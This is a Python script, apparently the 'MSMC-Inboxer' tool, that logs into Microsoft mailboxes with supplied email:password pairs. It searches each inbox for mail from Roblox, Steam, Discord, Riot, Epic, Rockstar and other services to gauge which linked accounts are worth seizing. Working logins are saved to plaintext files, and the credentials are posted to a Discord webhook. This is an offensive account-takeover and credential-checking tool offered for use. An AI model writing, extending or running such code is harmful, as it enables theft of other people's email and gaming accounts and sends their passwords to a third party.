import requests
import json
import os
import logging
import msal
from datetime import datetime

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# Azure AD App Registration Configuration
CLIENT_ID = "YOUR_CLIENT_ID"  # Register at https://portal.azure.com
AUTHORITY = "https://login.microsoftonline.com/common"
SCOPE = ["https://graph.microsoft.com/.default"]

# Load configuration files
try:
    with open('Inbox/config.json', 'r') as config_file:
        config = json.load(config_file)
    with open('Inbox/custom_checks.json', 'r') as custom_file:
        custom_checks = json.load(custom_file)
except Exception as e:
    logger.error(f"Failed to load config files: {e}")
    raise

# Default Checks
check_roblox = config["default_checks"]["roblox"]
check_steam = config["default_checks"]["steam"]
check_discord = config["default_checks"]["discord"]
check_reddit = config["default_checks"]["reddit"]
check_epicgames = config["default_checks"]["epicgames"]
check_riot = config["default_checks"]["riotgames"]
check_rockstar = config["default_checks"]["rockstargames"]

discord_webhook = config["discord_webhook"]

def get_access_token(email, password):
    """Get access token using MSAL with username/password flow"""
    app = msal.PublicClientApplication(
        CLIENT_ID,
        authority=AUTHORITY
    )
    
    result = app.acquire_token_by_username_password(
        username=email,
        password=password,
        scopes=SCOPE
    )
    
    if "access_token" in result:
        return result["access_token"]
    else:
        logger.error(f"Authentication failed: {result.get('error_description')}")
        return None

def search_emails(token, query):
    """Search emails using Microsoft Graph API"""
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }
    
    try:
        response = requests.get(
            f"https://graph.microsoft.com/v1.0/me/messages?$search=\"{query}\"",
            headers=headers
        )
        response.raise_for_status()
        return response.json().get("value", [])
    except Exception as e:
        logger.error(f"Error searching emails: {e}")
        return []

def get_email_date(email_data):
    """Extract date from email data"""
    try:
        return datetime.strptime(email_data["receivedDateTime"], "%Y-%m-%dT%H:%M:%SZ").year
    except Exception as e:
        logger.warning(f"Error parsing date: {e}")
        return None

def check_account(email, password):
    """Main function to check email account"""
    token = get_access_token(email, password)
    if not token:
        return None

    counts = {}
    discord_year = None
    reddit_year = None

    if check_roblox:
        roblox_emails = search_emails(token, 'from:accounts@roblox.com OR from:no-reply@roblox.com')
        counts['Roblox'] = len(roblox_emails)

    if check_steam:
        steam_emails = search_emails(token, 'from:noreply@steampowered.com')
        counts['Steam'] = len(steam_emails)

    if check_discord:
        discord_emails = search_emails(token, 'from:noreply@discord.com')
        counts['Discord'] = len(discord_emails)
        if discord_emails:
            discord_year = get_email_date(discord_emails[0])

    if check_reddit:
        reddit_emails = search_emails(token, 'from:noreply@reddit.com OR from:noreply@redditmail.com')
        counts['Reddit'] = len(reddit_emails)
        if reddit_emails:
            reddit_year = get_email_date(reddit_emails[0])

    if check_epicgames:
        epic_emails = search_emails(token, 'from:help@accts.epicgames.com')
        counts['Epic Games'] = len(epic_emails)

    if check_riot:
        riot_emails = search_emails(token, 'from:noreply@mail.accounts.riotgames.com')
        counts['Riot'] = len(riot_emails)

    if check_rockstar:
        rockstar_emails = search_emails(token, 'from:noreply@rockstargames.com')
        counts['Rockstar'] = len(rockstar_emails)

    for check_name, check_info in custom_checks.items():
        if check_name.lower() == "example_check":
            continue
        if check_info.get("enabled", False):
            custom_emails = search_emails(token, f'from:{check_info["email"]}')
            counts[check_name] = len(custom_emails)

    if not os.path.exists('Valid Mails'):
        os.makedirs('Valid Mails')

    for service, count in counts.items():
        if count > 0:
            with open(f'Valid Mails/{service}.txt', 'a') as file:
                file.write(f'{email}:{password} | {count} hits\n')

    if any(count > 0 for count in counts.values()):
        embed = {
            "title": "Valid Mail",
            "description": f"{email}:{password}",
            "color": 0x00f556,
            "fields": [],
            "footer": {
                "text": ".gg/PGer • MSMC-Inboxer"
            }
        }

        for service, count in counts.items():
            if count > 0:
                if service == 'Reddit' and reddit_year:
                    embed["fields"].append({
                        "name": service,
                        "value": f"``{count} Hits (Estimated Year: {reddit_year})``",
                        "inline": True
                    })
                elif service == 'Discord' and discord_year:
                    embed["fields"].append({
                        "name": service,
                        "value": f"``{count} Hits (Estimated Year: {discord_year})``",
                        "inline": True
                    })
                else:
                    embed["fields"].append({
                        "name": service,
                        "value": f"``{count} Hits``",
                        "inline": True
                    })

        try:
            response = requests.post(discord_webhook, json={"embeds": [embed]})
            if response.status_code != 204:
                logger.error(f"Webhook failed: {response.status_code}, {response.text}")
        except Exception as e:
            logger.error(f"Webhook error: {e}")

if __name__ == '__main__':
    email = input("Enter email: ")
    password = input("Enter password: ")
    check_account(email, password)